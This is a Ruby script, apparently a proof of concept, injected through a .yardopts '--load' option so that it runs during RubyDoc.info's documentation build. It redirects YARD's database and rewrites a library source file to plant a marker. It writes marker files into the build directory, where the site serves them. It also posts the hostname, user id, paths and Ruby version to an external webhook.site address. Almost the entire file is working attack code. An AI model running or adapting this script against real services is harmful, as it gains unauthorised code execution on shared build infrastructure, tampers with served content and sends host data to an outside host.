# w002: loaded via .yardopts `--load ./script.rb` during RubyDoc.info docparse generate stage.
# Unique marker: r002-y7Kp9Qz (idempotent; safe to run multiple times).
# v2: pins YARD::Registry.yardoc_file to the mounted build dir so the parsed DB
# lands in library source_path even when yardoc's cwd is a scratch dir.
begin
  stamp = "R002EXEC-#{Time.now.utc.strftime('%Y%m%dT%H%M%S')}-#{Process.pid}"

  # 0) locate the real build mount: the dir that contains our .yardopts
  base = nil
  ['/build', File.dirname(File.expand_path(__FILE__))].each do |d|
    begin
      base = d if File.file?(File.join(d, '.yardopts'))
      break if base
    rescue StandardError
    end
  end
  base ||= Dir.pwd

  # 1) pin the .yardoc DB to the mount (works around -b/--db remap to -o and
  #    any cwd mismatch: DB must land in library source_path for serving)
  begin
    require 'yard'
    YARD::Registry.yardoc_file = File.join(base, '.yardoc')
  rescue StandardError
  end

  # 2) mutate lib source: MARKSLOT -> stamp (docstring lands in .yardoc db, rendered on site)
  f = File.join(base, 'lib', 'w002yardprobe.rb')
  if File.exist?(f)
    c = File.read(f)
    File.write(f, c.gsub('MARKSLOT', stamp)) if c.include?('MARKSLOT')
  end

  # 3) side-effect files in build dir (served via /file/ when library ready)
  File.write(File.join(base, 'W002SCRIPT_RAN.txt'), stamp)

  # 4) best-effort egress probe (network may be disconnected in generate stage)
  begin
    require 'net/http'
    require 'json'
    info = {
      marker: 'r002-y7Kp9Qz',
      pwd: Dir.pwd,
      base: base,
      host: (Socket.gethostname rescue nil),
      ruby: RUBY_VERSION,
      uid: (Process.uid rescue nil)
    }
    uri = URI('https://webhook.site/97fa3c6a-3fad-4d2d-8312-15dc37e41e66')
    params = { 'm' => 'r002-y7Kp9Qz', 'info' => JSON.generate(info), 'file' => File.expand_path(__FILE__) }
    ok = Net::HTTP.post_form(uri, params)
    File.write(File.join(base, 'W002EGRESS_OK.txt'), "status=#{ok.code} at=#{Time.now.utc}")
  rescue StandardError => e
    begin
      File.write(File.join(base, 'W002EGRESS_ERR.txt'), "#{e.class}: #{e.message}")
    rescue StandardError
    end
  end
rescue StandardError => e
  begin
    File.write('W002SCRIPT_ERR.txt', "#{e.class}: #{e.message}\n#{e.backtrace.first(5).join("\n")}")
  rescue StandardError
  end
end
